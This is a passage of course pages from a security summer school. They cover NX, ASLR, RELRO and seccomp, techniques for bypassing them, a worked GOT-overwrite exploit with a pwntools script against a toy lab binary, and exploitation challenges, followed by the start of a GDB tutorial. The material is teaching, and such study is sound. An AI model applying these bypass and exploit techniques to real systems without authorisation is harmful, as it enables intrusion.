&lt;/code>&lt;/pre>&lt;p>Make sure you have both &lt;code>build-essential&lt;/code> and &lt;code>gcc-multilib&lt;/code> packages installed before going further (run &lt;code>sudo apt install build-essential gcc-multilib&lt;/code> on Debian-based systems).&lt;/p>
&lt;p>Compile the &lt;code>hello.c&lt;/code> code using &lt;code>CFLAGS='-m32 -O0' make hello&lt;/code>. The result should be a &lt;code>hello&lt;/code> binary.&lt;/p>
&lt;p>As presented in the &lt;code>Static Analysis&lt;/code> session, the ELF format contains flags for each segment that specify what permissions should be granted. You can use &lt;code>readelf -l hello&lt;/code> to dump all program headers for this binary. The result should be similar to:&lt;/p>
&lt;pre tabindex="0">&lt;code>Program Headers:
Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align
PHDR 0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
INTERP 0x000154 0x08048154 0x08048154 0x00013 0x00013 R 0x1
[Requesting program interpreter: /lib/ld-linux.so.2]
LOAD 0x000000 0x08048000 0x08048000 0x00568 0x00568 R E 0x1000
LOAD 0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW 0x1000
DYNAMIC 0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW 0x4
NOTE 0x000168 0x08048168 0x08048168 0x00044 0x00044 R 0x4
GNU_EH_FRAME 0x000490 0x08048490 0x08048490 0x0002c 0x0002c R 0x4
GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10
GNU_RELRO 0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R 0x1
Section to Segment mapping:
Segment Sections...
00
01 .interp
02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame
03 .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss
04 .dynamic
05 .note.ABI-tag .note.gnu.build-id
06 .eh_frame_hdr
07
08 .init_array .fini_array .jcr .dynamic .got
&lt;/code>&lt;/pre>&lt;p>Check the &lt;code>Flg&lt;/code> column. For example, the first &lt;code>LOAD&lt;/code> segment contains &lt;code>.text&lt;/code> and is marked &lt;code>R E&lt;/code>, while the &lt;code>GNU_STACK&lt;/code> segment is marked &lt;code>RW &lt;/code>.&lt;/p>
&lt;p>Next we are interested in seeing calls to &lt;code>mmap2()&lt;/code> and &lt;code>mprotect()&lt;/code> made by the loader. We are going to use the &lt;code>strace&lt;/code> tool for this, and directly execute the loader. You can check the path to the loader on your system using &lt;code>ldd hello&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ strace -e mmap2,mprotect /lib/ld-linux.so.2 ./hello
&lt;/code>&lt;/pre>&lt;p>The output should be similar to:&lt;/p>
&lt;pre tabindex="0">&lt;code>[ Process PID=11198 runs in 32 bit mode. ]
mmap2(0x8048000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8048000
mmap2(0x8049000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8049000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffc000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffa000
mmap2(NULL, 156324, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd3000
mmap2(NULL, 1763964, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e24000
mmap2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a9000) = 0xfffffffff7fcd000
mmap2(0xf7fd0000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e23000
mprotect(0xf7fcd000, 8192, PROT_READ) = 0
mprotect(0x8049000, 4096, PROT_READ) = 0
mprotect(0x56575000, 4096, PROT_READ) = 0
&lt;/code>&lt;/pre>&lt;p>We can observe a &lt;code>PROT_READ|PROT_EXEC&lt;/code> mapping at address &lt;code>0x8048000&lt;/code>, followed by a &lt;code>PROT_READ|PROT_WRITE&lt;/code> at address &lt;code>0x8049000&lt;/code> that is later changed to &lt;code>PROT_READ&lt;/code> for the first half (4096 bytes). The later allocation is the data segment, that should be writable. We can also see a bunch of allocations for segments belonging to dynamic libraries.&lt;/p>
&lt;p>Note that the &lt;strong>stack&lt;/strong> is not explicitly allocated by the loader. The kernel will keep increasing it each time a page fault is triggered without calling &lt;code>mmap&lt;/code>. Also, the &lt;strong>heap&lt;/strong> will be extended on-demand as the application requires it.&lt;/p>
&lt;p>We can dump all memory mappings of the running process as follows:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ps u | grep /lib/ld-linux.so.2
... # get the PID of the loader process from this output, let&amp;#39;s assume it is 11198
$ cat /proc/11198/maps
&lt;/code>&lt;/pre>&lt;p>Make sure to use the PID of the loader process, and not the &lt;code>strace&lt;/code> process.&lt;/p>
&lt;p>The output of the last &lt;code>cat&lt;/code> command should be similar to:&lt;/p>
&lt;pre tabindex="0">&lt;code>08048000-08049000 r-xp 00000000 00:22 5769082 /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
08049000-0804a000 r--p 00000000 00:22 5769082 /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
0804a000-0804b000 rw-p 00001000 00:22 5769082 /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
56555000-56575000 r-xp 00000000 08:05 827365 /lib/i386-linux-gnu/ld-2.19.so
56575000-56576000 r--p 0001f000 08:05 827365 /lib/i386-linux-gnu/ld-2.19.so
56576000-56577000 rw-p 00020000 08:05 827365 /lib/i386-linux-gnu/ld-2.19.so
f7e23000-f7e24000 rw-p 00000000 00:00 0
f7e24000-f7fcd000 r-xp 00000000 08:05 823395 /lib/i386-linux-gnu/libc-2.19.so
f7fcd000-f7fcf000 r--p 001a9000 08:05 823395 /lib/i386-linux-gnu/libc-2.19.so
f7fcf000-f7fd0000 rw-p 001ab000 08:05 823395 /lib/i386-linux-gnu/libc-2.19.so
f7fd0000-f7fd3000 rw-p 00000000 00:00 0
f7ffa000-f7ffd000 rw-p 00000000 00:00 0
f7ffd000-f7ffe000 r-xp 00000000 00:00 0 [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0 [stack]
&lt;/code>&lt;/pre>&lt;h3 id="ways-of-bypassing-nx">Ways of Bypassing NX&lt;/h3>
&lt;p>Below are a few methods of exploiting a binary that has &lt;strong>NX&lt;/strong> enabled:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>ret-to-plt/libc&lt;/strong>. You can return to the &lt;code>.plt&lt;/code> section and call library function already linked. You can also call other library functions based on their known offsets. The latter approach assumes no ASLR (see next section), or the possibility of an information leak.&lt;/li>
&lt;li>&lt;strong>mprotect()&lt;/strong>. If the application is using &lt;code>mprotect()&lt;/code> you can easily call it to modify the permissions and include &lt;code>PROT_EXEC&lt;/code> for the stack. You can also call this in a &lt;code>ret-to-libc&lt;/code> attack. You can also &lt;code>mmap&lt;/code> a completely new memory region and dump the shellcode there.&lt;/li>
&lt;li>&lt;strong>Return Oriented Programming (ROP)&lt;/strong>. This is a generalization of the &lt;code>ret-to-*&lt;/code> approach that makes use of existing code to execute almost anything. As this is probably one of the most common types of attacks, it will be discussed in depth in a future section.&lt;/li>
&lt;/ul>
&lt;h3 id="address-space-layout-randomization">Address Space Layout Randomization&lt;/h3>
&lt;p>&lt;strong>Address Space Layout Randomization (ASLR)&lt;/strong> is a security feature that maps different memory regions of an executable at random addresses. This prevents buffer overflow-based attacks that rely on known addresses such as the stack (for calling into shellcode), or dynamically linked libraries (for calling functions that were not already linked with the target binary). Usually, the sections that are randomly mapped are: the stack, the heap, the VDSO page, and the dynamic libraries. The code section can also be randomly mapped for &lt;a href="https://en.wikipedia.org/wiki/Position-independent_code#PIE">PIE&lt;/a> binaries.&lt;/p>
&lt;p>Linux allows 3 options for its ASLR implementation that can be configured using the &lt;code>/proc/sys/kernel/randomize_va_space&lt;/code> file. Writing &lt;strong>0&lt;/strong>, &lt;strong>1&lt;/strong> or &lt;strong>2&lt;/strong> to this will results in the following behaviors:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>0&lt;/strong>: deactivated;&lt;/li>
&lt;li>&lt;strong>1&lt;/strong>: random stack, vdso, libraries; heap is after code section; random code section (only for PIE-linked binaries);&lt;/li>
&lt;li>&lt;strong>2&lt;/strong>: random heap too.&lt;/li>
&lt;/ul>
&lt;p>Make sure you reactivate ASLR after the previous section of the tutorial, by one of the two options below.&lt;/p>
&lt;p>If you disabled ASLR system-wide, re-enable it using (root access is required):&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo bash -c &amp;#39;echo 2 &amp;gt; /proc/sys/kernel/randomize_va_space&amp;#39;
&lt;/code>&lt;/pre>&lt;p>If you disabled ASLR at shell level, simply &lt;strong>close the shell&lt;/strong> such as issuing the &lt;code>Ctrl+d&lt;/code> keyboard shortcut.&lt;/p>
&lt;p>We can easily demonstrate the effects of ASLR on shared libraries by running &lt;code>ldd&lt;/code> multiple times in a row on a binary such as &lt;code>/bin/ls&lt;/code>.&lt;/p>
&lt;p>In GDB, ASLR is disabled by default in order to reduce the non-determinism and make debugging easier. However, when developing exploits we will sometimes want to test them in conjunction with ASLR. To enable ASLR in GDB, use the following command:&lt;/p>
&lt;pre tabindex="0">&lt;code>pwndbg&amp;gt; set disable-randomization off
&lt;/code>&lt;/pre>&lt;h3 id="ways-of-bypassing-aslr">Ways of Bypassing ASLR&lt;/h3>
&lt;p>Below are a few methods of exploiting a binary that has &lt;strong>ASLR&lt;/strong> enabled:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Bruteforce&lt;/strong>. If you are able to inject payloads multiple times without crashing the application, you can bruteforce the address you are interested in (e.g., a target in libc). Otherwise, you can just run the exploit multiple times. Another thing to keep in mind is that, as addresses are randomized at load-time, child processes spawned with fork inherit the memory layout of the parent. Take the following scenario: we interact with a vulnerable sever that handles connections by forking to another process. We manage to obtain a leak from a child process but we are not able to create an exploit chain that leads to arbitrary code execution. However, we may still be able to use this leak in another connection, since the new process will have the same address space as the previous.&lt;/li>
&lt;li>&lt;strong>NOP sled&lt;/strong>. In the case of shellcodes, a longer NOP sled will maximize the chances of jumping inside it and eventually reaching the exploit code even if the stack address is randomized. This is not very useful when we are interested in jumping to libc or other functions, which is usually the case if the executable space protection is also active.&lt;/li>
&lt;li>&lt;strong>jmp esp&lt;/strong>. This will basically jump into the stack, no matter where it is mapped. It&amp;rsquo;s actually a very rudimentary form of Return Oriented Programming which was discussed in the previous session.&lt;/li>
&lt;li>&lt;strong>Restrict entropy&lt;/strong>. There are various ways of reducing the entropy of the randomized address. For example, you can decrease the initial stack size by setting a huge amount of dummy environment variables.&lt;/li>
&lt;li>&lt;strong>Partial overwrite&lt;/strong>. This technique is useful when we are able to overwrite only the least significant byte(s) of an address (e.g. a GOT entry). We must take into account the offsets of the original and final addresses from the beginning of the mapping. If these offsets only differ in the last 8 bits, the exploit is deterministic, as the base of the mapping is aligned to 0x1000. The offsets of &lt;code>read&lt;/code> and &lt;code>write&lt;/code> in &lt;code>libc6_2.27-3ubuntu1.2_i386&lt;/code> are suitable for a partial overwrite:&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>pwndbg&amp;gt; p read
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xe6dd0 &amp;lt;__GI___libc_read&amp;gt;
pwndbg&amp;gt; p write
$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xe6ea0 &amp;lt;__GI___libc_write&amp;gt;
&lt;/code>&lt;/pre>&lt;p>However, since bits 12-16 of the offsets differ, the corresponding bits in the full addresses would have to be bruteforced (probability 1/4).&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Information leak&lt;/strong>. The most effective way of bypassing ASLR is by using an information leak vulnerability that exposes randomized address, or at least parts of them. You can also dump parts of libraries (e.g. &lt;code>libc&lt;/code>) if you are able to create an exploit that reads them. This is useful in remote attacks to infer the version of the library, downloading it from the web, and thus knowing the right offsets for other functions (not originally linked with the binary).&lt;/li>
&lt;/ul>
&lt;h3 id="chaining-information-leaks-with-got-overwrite">Chaining Information Leaks with GOT Overwrite&lt;/h3>
&lt;p>In this tutorial we will exploit a program that is similar to the &lt;code>no-ret-control&lt;/code> challenge from a previous session:&lt;/p>
&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
int main() {
int *addr;
printf(&amp;#34;Here&amp;#39;s a libc address: 0x%08x\n&amp;#34;, printf);
printf(&amp;#34;Give me and address to modify!\n&amp;#34;);
scanf(&amp;#34;%p&amp;#34;, &amp;amp;addr);
printf(&amp;#34;Give me a value!\n&amp;#34;);
scanf(&amp;#34;%u&amp;#34;, addr);
sleep(10);
printf(&amp;#34;Abandon all hope ye who reach this...\n&amp;#34;);
}
&lt;/code>&lt;/pre>&lt;p>The goal is to alter the execution flow and avoid reaching the final &lt;code>printf&lt;/code>. To this end, we will overwrite the &lt;code>sleep&lt;/code> entry in GOT and redirect it to &lt;code>exit&lt;/code>. However, due to ASLR, the value can not be hardcoded and must be computed at runtime.&lt;/p>
&lt;p>Whenever we operate with addresses belonging to shared libraries, we must be aware that the offsets are highly dependent on the particular build of the library. We can identify this build either by its BuildID (retrieved with the file command), or by its version string:&lt;/p>
&lt;pre tabindex="0">&lt;code>silvia@imladris:/sss/demo$ ldd ./got_overwrite
linux-gate.so.1 (0xf7ee8000)
libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ccc000)
/lib/ld-linux.so.2 (0xf7ee9000)
silvia@imladris:/sss/demo$ file $(realpath /lib/i386-linux-gnu/libc.so.6)
/lib/i386-linux-gnu/libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cf1599aa8b3cb35f79dcaea7a8b48704ecf42a19, for GNU/Linux 3.2.0, stripped
silvia@imladris:/sss/demo$ strings /lib/i386-linux-gnu/libc.so.6 | grep &amp;#34;GLIBC &amp;#34;
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
&lt;/code>&lt;/pre>&lt;p>Alternatively, if we don&amp;rsquo;t have prior knowledge of the remote system where the binary runs, but obtain via an information leak some addresses, we may be able to identify the libc based on the last 3 nibbles (a nibble is a group of 4 bits) of these addresses:&lt;/p>
&lt;pre tabindex="0">&lt;code>0xf7df6250 &amp;lt;__libc_system&amp;gt;
0xf7e780e0 &amp;lt;__sleep&amp;gt;
&lt;/code>&lt;/pre>&lt;p>The least significant 3 nibbles of the above addresses are &lt;code>250&lt;/code> and &lt;code>0e0&lt;/code>, respectively.&lt;/p>
&lt;p>We enter them in the &lt;a href="https://libc.blukat.me/">libc database&lt;/a> and get a match for the same &lt;code>libc&lt;/code> build we determined earlier.&lt;/p>
&lt;p>For this &lt;code>libc&lt;/code>, we obtain the offsets of the functions we are interested in using GDB:&lt;/p>
&lt;pre tabindex="0">&lt;code>silvia@imladris:/sss/demo$ gdb -q -n /lib/i386-linux-gnu/libc.so.6
(gdb) p printf
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x513a0 &amp;lt;__printf&amp;gt;
(gdb) p exit
$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0x30420 &amp;lt;__GI_exit&amp;gt;
&lt;/code>&lt;/pre>&lt;p>We will also need the address of &lt;code>sleep@got&lt;/code> (which is static because the binary is not position independent):&lt;/p>
&lt;pre tabindex="0">&lt;code>silvia@imladris:/sss/demo$ objdump -d -M intel -j .plt ./got_overwrite | grep &amp;#34;sleep@plt&amp;#34; -A1
080483b0 &amp;lt;sleep@plt&amp;gt;:
80483b0: ff 25 0c a0 04 08 jmp DWORD PTR ds:0x804a00c
&lt;/code>&lt;/pre>&lt;p>We start the program and compute the address of exit based on the leak of printf (in another terminal):&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt;&amp;gt;&amp;gt; printf_offset = 0x513a0
&amp;gt;&amp;gt;&amp;gt; exit_offset = 0x30420
&amp;gt;&amp;gt;&amp;gt; 0xf7dfb3a0 - printf_offset + exit_offset
4158497824
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>silvia@imladris:/sss/demo$ ./got_overwrite
Here&amp;#39;s a libc address: 0xf7dfb3a0
Give me and address to modify!
0x804a00c
Give me a value!
4158497824
silvia@imladris:/sss/demo$ echo $?
10
&lt;/code>&lt;/pre>&lt;p>As we intended, the &lt;code>GOT&lt;/code> entry corresponding to &lt;code>sleep&lt;/code> was overwritten by exit and the program exited with code 10 without printing the final message.&lt;/p>
&lt;p>The following pwntools script automates this interaction:&lt;/p>
&lt;pre tabindex="0">&lt;code>from pwn import *
p = process(&amp;#39;./got_overwrite&amp;#39;)
libc = ELF(&amp;#39;/lib/i386-linux-gnu/libc.so.6&amp;#39;)
sleep_got = p.elf.got[&amp;#39;sleep&amp;#39;]
p.recvuntil(&amp;#39;libc address:&amp;#39;)
libc_leak = int(p.recvuntil(&amp;#39;\n&amp;#39;)[:-1], 16)
libc_base = libc_leak - libc.symbols[&amp;#39;printf&amp;#39;]
print(&amp;#34;Libc base is at: 0x%x&amp;#34; % libc_base)
exit = libc_base + libc.symbols[&amp;#39;exit&amp;#39;]
p.sendline(hex(sleep_got))
p.recvuntil(&amp;#39;value!&amp;#39;)
p.sendline(str(exit))
p.interactive()
&lt;/code>&lt;/pre>&lt;h3 id="relro">RELRO&lt;/h3>
&lt;p>&lt;strong>RELRO&lt;/strong> (&lt;strong>Rel&lt;/strong>ocation &lt;strong>R&lt;/strong>ead-&lt;strong>O&lt;/strong>nly) defends against attacks which overwrite data in relocation sections, such as the &lt;strong>GOT overwrite&lt;/strong> we showed earlier.&lt;/p>
&lt;p>It comes in two flavors:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Partial&lt;/strong>. Protects the &lt;code>.init_array&lt;/code>, &lt;code>.fini_array&lt;/code>, &lt;code>.dynamic&lt;/code> and &lt;code>.got&lt;/code> sections (but NOT &lt;code>.got.plt&lt;/code>);&lt;/li>
&lt;li>&lt;strong>Full&lt;/strong>. Additionally protects &lt;code>.got.plt&lt;/code>, rendering the &lt;strong>GOT overwrite&lt;/strong> attack infeasible.&lt;/li>
&lt;/ul>
&lt;p>In a previous session we explained how the addresses of dynamically linked functions are resolved using lazy binding. When Full RELRO is in effect, the addresses are resolved at load-time and then marked as read-only. Due to the way address space protection works, this means that the &lt;code>.got&lt;/code> resides in the read-only mapping, instead of the read-write mapping that contains the &lt;code>.bss&lt;/code>.&lt;/p>
&lt;p>This is not a game-over in terms of exploitation, as other overwriteable code pointers often exist. These can be specific to the application we want to exploit or reside in shared libraries (for example: the GOT of shared libraries that are not compiled with RELRO). The return addresses on the stack are still viable targets.&lt;/p>
&lt;h3 id="seccomp">seccomp&lt;/h3>
&lt;p>&lt;strong>Seccomp&lt;/strong> is a mechanism though which an application may transition into a state where the system calls it performs are restricted. The policy, which may act on a whitelist or blacklist model, is described using &lt;a href="https://lwn.net/Articles/593476/">eBPF&lt;/a>.&lt;/p>
&lt;p>&lt;strong>Seccomp&lt;/strong> filters are instated using the &lt;code>prctl&lt;/code> syscall (&lt;code>PR_SET_SECCOMP&lt;/code>). Once it is in effect, the application will be effectively sandboxed and the restrictions will be inherited by child processes.&lt;/p>
&lt;p>This may severely limit our exploitation prospects in some cases. In the challenges that we have solved during these sessions, a common goal was spawning a shell and retrieving a certain file (the flag). If the exploited binary used a seccomp filter that disallowed the &lt;code>execve&lt;/code> syscall (used by the &lt;code>system&lt;/code> library function), this would have thwarted our exploit.&lt;/p>
&lt;p>The &lt;a href="https://github.com/david942j/seccomp-tools">seccomp-tools&lt;/a> suite provides tools for analyzing seccomp filters. The &lt;code>dump&lt;/code> subcommand may be used to extract the filter from a binary at runtime and display it in a pseudocode format:&lt;/p>
&lt;pre tabindex="0">&lt;code>silvia@imladris:/sss/demo$ seccomp-tools dump ./seccomp_example
line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x00 0x09 0x40000003 if (A != ARCH_I386) goto 0011
0002: 0x20 0x00 0x00 0x00000000 A = sys_number
0003: 0x15 0x07 0x00 0x000000ad if (A == rt_sigreturn) goto 0011
0004: 0x15 0x06 0x00 0x00000077 if (A == sigreturn) goto 0011
0005: 0x15 0x05 0x00 0x000000fc if (A == exit_group) goto 0011
0006: 0x15 0x04 0x00 0x00000001 if (A == exit) goto 0011
0007: 0x15 0x03 0x00 0x00000005 if (A == open) goto 0011
0008: 0x15 0x02 0x00 0x00000003 if (A == read) goto 0011
0009: 0x15 0x01 0x00 0x00000004 if (A == write) goto 0011
0010: 0x06 0x00 0x00 0x00050026 return ERRNO(38)
0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW
&lt;/code>&lt;/pre>&lt;p>In the example above we see a filter operating on the whitelist model: it specifies a subset of syscalls that are allowed: &lt;code>rt_sigreturn&lt;/code>, &lt;code>sigreturn&lt;/code>, &lt;code>exit_group&lt;/code>, &lt;code>exit&lt;/code>, &lt;code>open&lt;/code>, &lt;code>read&lt;/code> and &lt;code>write&lt;/code>.&lt;/p>
&lt;p>To install &lt;code>seccomp-tools&lt;/code> on the Kali VM, use the the &lt;code>gem&lt;/code> package manager:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ gem install seccomp-tools
&lt;/code>&lt;/pre>&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;p>Challenges can be found in the &lt;code>activities/&lt;/code> directory.&lt;/p>
&lt;h3 id="01-04-challenges---rwslotmachine1-4">01-04. Challenges - rwslotmachine[1-4]&lt;/h3>
&lt;p>All of the challenges in this section are intended to be solved with &lt;strong>ASLR enabled&lt;/strong>. However, you are free to disable it while developing your exploit for debugging purposes. You are provided with the needed shared libraries from the remote system.&lt;/p>
&lt;p>The challenges are based on the same &amp;ldquo;application&amp;rdquo;: the binaries expose very similar functionality with minimal implementation differences. Your job is to identify the defense mechanisms in use for each of them and bypass them in order to read a flag from the remote system.&lt;/p>
&lt;p>They are numbered in the suggested solving order.&lt;/p>
&lt;p>&lt;strong>Tips&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>Do not waste time on reverse engineering &lt;code>rwslotmachine3&lt;/code>! It is very similar to &lt;code>rwslotmachine2&lt;/code>, but operates on the client/server model.&lt;/li>
&lt;li>To set &lt;code>LD_LIBRARY_PATH&lt;/code> from within a pwntools script, use &lt;code>p = process('./rwslotmachineX', env={'LD_LIBRARY_PATH' : '.'})&lt;/code>.&lt;/li>
&lt;li>In the case of &lt;code>rwslotmachine4&lt;/code>, you will need the shared library &lt;code>libint.so&lt;/code> (found inside of the github repo).&lt;/li>
&lt;/ul>
&lt;h3 id="05-bonus---rwslotmachine5">05. Bonus - rwslotmachine5&lt;/h3>
&lt;p>This challenge is similar to &lt;code>rwslotmachine1&lt;/code>. However, your exploit for the first challenge will (most likely) not work. Investigate why and develop a bypass.&lt;/p>
&lt;p>&lt;strong>Hint&lt;/strong>: You can find a table describing x86 syscalls &lt;a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit">here&lt;/a>.&lt;/p>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/PaX#PAGEEXEC">PaX PAGEEXEC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/PaX#SEGMEXEC">PaX SEGMEXEC&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf">Black Hat &amp;amp; DEF CON 2010, JIT spraying slides&lt;/a>;&lt;/li>
&lt;li>&lt;a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf">Interpreter Exploitation. Pointer Inference and JIT Spraying&lt;/a>.&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention">DEP&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://lwn.net/Articles/593476/">eBPF&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Binary:</title><link>/binary/dynamic-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/dynamic-analysis/</guid><description>
&lt;h1 id="dynamic-analysis">Dynamic Analysis&lt;/h1>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;h4 id="objectives--rationale">Objectives &amp;amp; Rationale&lt;/h4>
&lt;p>The first part of this session will give you a walkthrough of the most common GDB principles that we are going to use in exploitation. In the second half, we are going to use these concepts in practice, to evade a basic key evaluation program.&lt;/p>
&lt;p>Black Box type analysis works best when standard algorithms are used in the program, such as: MD5, SHA1,RSA . We can change the input to a more suggestive one and use the output to estimate what function was used to convert it.&lt;/p>
&lt;p>Combined with behavioral analysis methods such as using sandboxes or strace/ltrace we can quickly map sections of code to functionalities.&lt;/p>
&lt;p>With dynamic analysis, packed malware can be extracted from memory in unpacked form, enabling us to continue static analysis on the complete binary.&lt;/p>
&lt;h4 id="prerequisites">Prerequisites&lt;/h4>
&lt;p>In the current session we will use GDB extensively. We assume that you are familiar with its basic usage and will move on quickly to some of its more advanced features.&lt;/p>
&lt;p>To brush up on the GDB basics, read this &lt;a href="https://security.cs.pub.ro/summer-school/wiki/session/04-gdb" title="session:04-gdb">Refresher&lt;/a>.&lt;/p>
&lt;p>The executable used in the demo is called sppb and is the challenge 1 binary.&lt;/p>
&lt;h6 id="before-gdb">Before GDB&lt;/h6>
&lt;h5 id="one-thing-you-should-always-do-before-firing-up-gdb-is-to-try-to-learn-all-the-available-information-on-the-executable-youre-trying-to-debug-through-the-techniques-that-have-been-presented-so-far">One thing you should always do before firing up GDB is to try to learn all the available information on the executable you're trying to debug through the techniques that have been presented so far.&lt;/h5>
&lt;p>For the purposes of this session it is a good idea to always run&lt;code>objdump&lt;/code> on all the executable files before attaching GDB to them so that you have a better idea of what goes where.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ objdump -M intel -d [executable]
&lt;/code>&lt;/pre>&lt;h3 id="gdb-basic-commands">GDB Basic Commands&lt;/h3>
&lt;h4 id="getting-help-with-gdb">Getting help with GDB&lt;/h4>
&lt;p>Whenever you want to find out more information about GDB commands feel free to search for it inside &lt;a href="http://www.gnu.org/software/gdb/documentation/" title="http://www.gnu.org/software/gdb/documentation/">the documentation&lt;/a> or by using the &lt;code>help&lt;/code> command followed by your area of interest. For example searching for help for the &lt;code>disassemble&lt;/code> command can be obtained by running the following command in GDB:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">#print info about all help areas available
#identify the area of your question
(gdb) help
#print info about available data commands
#identify the command you want to learn more about
(gdb) help data
#print info about a specific command
#find out more about the command you are searching for
(gdb) help disassemble
&lt;/code>&lt;/pre>&lt;h4 id="opening-a-program-with-gdb">Opening a program with GDB&lt;/h4>
&lt;p>A program can be opened for debugging in a number of ways. We can run
GDB directly attaching it to a program:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ gdb [executable-file]
&lt;/code>&lt;/pre>&lt;p>Or we can open up GDB and then specify the program we are trying to
attach to using the file or file-exec command:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ gdb
(gdb) file [executable-file]
&lt;/code>&lt;/pre>&lt;p>Furthermore we can attach GDB to a running service if we know its
process id:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ gdb --pid [pid_number]
&lt;/code>&lt;/pre>&lt;h4 id="disassembling">Disassembling&lt;/h4>
&lt;p>GDB allows disassembling of binary code using the &lt;code>disassemble&lt;/code> command
(it may be shortened to &lt;code>disas&lt;/code>). The command can be issued either on a
memory address or using labels.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) disassemble *main
Dump of assembler code for function main:
0x080491c9 &amp;lt;+0&amp;gt;: push ebp
0x080491ca &amp;lt;+1&amp;gt;: mov ebp,esp
0x080491cc &amp;lt;+3&amp;gt;: push ebx
0x080491cd &amp;lt;+4&amp;gt;: sub esp,0x4
=&amp;gt; 0x080491d0 &amp;lt;+7&amp;gt;: mov eax,ds:0x804c030
....Output ommited.....
(gdb) disassemble 0x080491c9
Dump of assembler code for function main:
0x080491c9 &amp;lt;+0&amp;gt;: push ebp
0x080491ca &amp;lt;+1&amp;gt;: mov ebp,esp
0x080491cc &amp;lt;+3&amp;gt;: push ebx
0x080491cd &amp;lt;+4&amp;gt;: sub esp,0x4
=&amp;gt; 0x080491d0 &amp;lt;+7&amp;gt;: mov eax,ds:0x804c030
&lt;/code>&lt;/pre>&lt;h4 id="adding-breakpoints">Adding Breakpoints&lt;/h4>
&lt;p>Breakpoints are important to suspend the execution of the program being debugged in a certain place. Adding breakpoints is done with the &lt;code>break&lt;/code>
command. A good idea is to place a breakpoint at the main function of the program you are trying to exploit. Given the fact that you have already run &lt;code>objdump&lt;/code> and disassembled the program you know the address for the start of the main function. This means that we can set a
